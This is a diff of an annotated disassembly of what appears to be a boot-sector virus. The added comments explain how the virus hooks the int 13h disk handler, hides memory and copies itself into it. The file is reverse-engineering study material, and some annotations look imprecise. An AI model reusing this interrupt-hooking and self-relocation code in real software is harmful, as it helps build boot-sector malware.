@@ -35,19 +35,19 @@ seg000:7C08    db 0Eh                                                           
 seg000:7C09    db 0                                                                          | 
 seg000:7C0A    word_7C0A dw 9739h ; DATA XREF: seg000:7CC1w                                  | 
 seg000:7C0C    word_7C0C dw 0F000h ; DATA XREF: seg000:7CC7w                                 | 
-seg000:7C0E    ; --------------------------------------------------------------------------- | 
-seg000:7C0E    push ds                                                                       | 
-seg000:7C0F    push ax                                                                       | 
-seg000:7C10    or dl, dl                                                                     | 
-seg000:7C12    jnz short loc_7C2F                                                            | 
-seg000:7C14    xor ax, ax                                                                    | 
-seg000:7C16    mov ds, ax                                                                    | 
-seg000:7C18    test byte ptr ds:43Fh, 1                                                      | 
-seg000:7C1D    jnz short loc_7C2F                                                            | 
-seg000:7C1F    pop ax                                                                        | 
-seg000:7C20    pop ds                                                                        | 
-seg000:7C21    pushf                                                                         | 
-seg000:7C22    call dword ptr cs:0Ah                                                         | 
+seg000:7C0E    ; --------------------------------------------------------------------------- | start of infected int13 handler
+seg000:7C0E    push ds                                                                       | push ds onto stack
+seg000:7C0F    push ax                                                                       | push ax onto stack
+seg000:7C10    or dl, dl                                                                     | dl OR dl
+seg000:7C12    jnz short loc_7C2F                                                            | jump if dl != 0: dl tells us what drive the caller is targeting
+seg000:7C14    xor ax, ax                                                                    | clear ax
+seg000:7C16    mov ds, ax                                                                    | clear ds
+seg000:7C18    test byte ptr ds:43Fh, 1                                                      | check if any drive motor running
+seg000:7C1D    jnz short loc_7C2F                                                            | jump if drive running
+seg000:7C1F    pop ax                                                                        | pop ax
+seg000:7C20    pop ds                                                                        | pop ds
+seg000:7C21    pushf                                                                         | push EFLAGS onto stack
+seg000:7C22    call dword ptr cs:0Ah                                                         | go back to checking drive motor
 seg000:7C27    pushf                                                                         | 
 seg000:7C28    call sub_7C36                                                                 | 
 seg000:7C2B    popf                                                                          | 
@@ -56,9 +56,9 @@ seg000:7C2F    ; ---------------------------------------------------------------
 seg000:7C2F                                                                                  | 
 seg000:7C2F    loc_7C2F: ; CODE XREF: seg000:7C12j                                           | 
 seg000:7C2F    ; seg000:7C1Dj                                                                | 
-seg000:7C2F    pop ax                                                                        | 
-seg000:7C30    pop ds                                                                        | 
-seg000:7C31    jmp dword ptr cs:0Ah                                                          | 
+seg000:7C2F    pop ax                                                                        | pop ax
+seg000:7C30    pop ds                                                                        | pop ds
+seg000:7C31    jmp dword ptr cs:0Ah                                                          | jmp back to checking drive motor
 seg000:7C36                                                                                  | 
 seg000:7C36    ; =============== S U B R O U T I N E ======================================= | 
 seg000:7C36                                                                                  | 
@@ -166,19 +166,19 @@ seg000:7CD2    mov cl, 6                                                        
 seg000:7CD4    shl ax, cl                                                                    | shift memory size left 6 bits
 seg000:7CD6    mov es, ax                                                                    | store shifted memory size in es: extra segment
 seg000:7CD8    mov ds:word_7C05, ax                                                          | save shifted memory size at word_7C05
-seg000:7CDB    mov ax, 0Eh                                                                   | store 0Eh in ax
-seg000:7CDE    mov ds:4Ch, ax                                                                | overwrite int13 handler byte 1 & 2 with 0Eh: the floppy disc operation complete handler
-seg000:7CE1    mov word ptr ds:4Eh, es                                                       | save shifted memory size into the 2 bytes starting at 4Eh: byte 2 of the int13 handler
+seg000:7CDB    mov ax, 0Eh                                                                   | store location of program continuation in ax
+seg000:7CDE    mov ds:4Ch, ax                                                                | overwrite int13 handler with that continuation
+seg000:7CE1    mov word ptr ds:4Eh, es                                                       | save shifted memory size into the 2 bytes starting at 4Eh: this is the other part that points to the high memory address of the copied program
 seg000:7CE5    mov cx, 1BEh                                                                  | store length of program in cx
 seg000:7CE8    mov si, 7C00h                                                                 | store start of program address in si: source index
 seg000:7CEB    xor di, di                                                                    | clear di: destination index
 seg000:7CED    cld                                                                           | set DF flag to 0: this increments si and di during the next operation
-seg000:7CEE    rep movsb                                                                     | copy this program to just above the now hidden memory location: Repeat cx(1BEh) times: Move byte at address ds:si to address es:di
+seg000:7CEE    rep movsb                                                                     | copy this program to high hidden memory location: Repeat cx(1BEh) times: Move byte at address ds:si to address es:di
 seg000:7CF0    jmp dword ptr cs:unk_7C03                                                     | jump to next line in program, but in new high memory location
 seg000:7CF5    ; --------------------------------------------------------------------------- | 
 seg000:7CF5    xor ax, ax                                                                    | clear ax
 seg000:7CF7    mov es, ax                                                                    | clear es
-seg000:7CF9    int 13h ; DISK - RESET DISK SYSTEM                                            | 
+seg000:7CF9    int 13h ; DISK - RESET DISK SYSTEM                                            | calls infected int13
 seg000:7CF9    ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)         | 
 seg000:7CFB    push cs                                                                       | 
 seg000:7CFC    pop ds                                                                        | 
